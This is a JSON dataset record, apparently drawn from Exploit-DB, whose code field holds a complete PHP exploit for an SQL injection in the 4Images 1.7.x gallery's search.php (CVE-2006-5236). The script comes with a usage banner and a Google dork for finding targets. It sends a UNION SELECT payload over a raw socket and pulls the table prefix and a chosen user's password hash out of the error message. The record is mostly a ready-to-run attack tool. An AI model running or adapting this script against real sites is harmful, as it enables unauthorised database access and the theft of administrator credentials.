{
  "id": "2487",
  "title": "4Images 1.7.x - &#039;search.php&#039; SQL Injection",
  "cve": "CVE-2006-5236",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php\r\n<?php\r\n/*\r\n4images 1.7.x Remote SQL Injection Vulnerability\r\n\r\nUsage: php file.php [host] [path] [table prefix] [user id]\r\n\r\nGoogledork \"powered by 4images 1.7.x\"\r\n\r\nVulnerability: Disfigure\r\nResearch: h3llfyr3\r\nCoding: Synsta.\r\n\r\nPoC:\r\n<target>/<4images_dir>/search.php?search_user=x%2527%20union%20select%20user_password%20from%204images_users%20where%20user_name=%2527ADMIN\r\n\r\n[w4ck1ng] - w4ck1ng.com\r\n*/\r\nif(!$argv[3]){\r\ndie(\"Usage:\r\nphp $argv[0] [host] [path] [options] [table prefix] [user id]\\n\r\nOptions:\r\n-d: Determine table prefix\\n\r\nExample:\r\nphp $argv[0] domain.com /4images/ 4images_ 1\r\nphp $argv[0] domain.com /4images/ -d\\n\");\r\n}\r\nif(eregi(\"http://\", $argv[1])){\r\ndie(\"Usage:\r\nphp $argv[0] [host] [path] [options] [table prefix] [user id]\\n\r\nOptions:\r\n-d: Determine table prefix\\n\r\nExample:\r\nphp $argv[0] domain.com /4images/ 4images_ 1\r\nphp $argv[0] domain.com /4images/ -d\\n\");\r\n}\r\nif($argv[3]==\"-d\"){\r\n$pipe = fsockopen($argv[1],80);\r\nif(!$pipe){\r\ndie(\"Cannot connect to host.\");\r\n} else {\r\n$sql = \"x%27\";\r\n$sql = urlencode($sql);\r\n$req =  \"GET $argv[2]\".\"search.php?search_user=\".\"$sql HTTP/1.1\\r\\n\";\r\n$req .= \"Host: $argv[1]\\r\\n\";\r\n$req .= \"Connection: Close\\r\\n\\r\\n\";\r\nfwrite($pipe , $req);\r\nwhile(!feof($pipe)) {\r\n$data .= fgets($pipe);\r\n}\r\n$gdata= explode(\"FROM \",$data);\r\n$gtab = explode(\"WHERE \",$gdata[1]);\r\n$tab = trim($gtab[0]);\r\n$tab = str_replace(\"users\",\"\",$tab);\r\nif(eregi(\"<br />\", $page)){ die(\"Failed..\"); }else{ die(\"Table Prefix: $tab\\n\"); }\r\n}\r\n}\r\nif($argv[4]){\r\n$pipe = fsockopen($argv[1],80);\r\nif(!$pipe){\r\ndie(\"Cannot connect to host.\");\r\n} else {\r\n$sql = \"x%27%20union%20select%20user_password%20from%20\".\"$argv[3]\".\"users%20where%20user_id%3D%27$argv[4]\";\r\n$sql = urlencode($sql);\r\n$req =  \"GET $argv[2]\".\"search.php?search_user=\".\"$sql HTTP/1.1\\r\\n\";\r\n$req .= \"Host: $argv[1]\\r\\n\";\r\n$req .= \"Connection: Close\\r\\n\\r\\n\";\r\nfwrite($pipe , $req);\r\nwhile(!feof($pipe)) {\r\n$data .= fgets($pipe);\r\n}\r\n$gdata = explode(\"Unknown column '\",$data);\r\n$ghash = explode(\"' in 'where clause'\",$gdata[1]);\r\n$hash = $ghash[0];\r\nif(strlen($hash) != 32){ die(\"Exploit failed..\\n\"); }else{ echo \"Outputted Hash: $hash\\n\"; }\r\n}\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-10-08]",
  "url": "https://www.exploit-db.com/exploits/2487"
}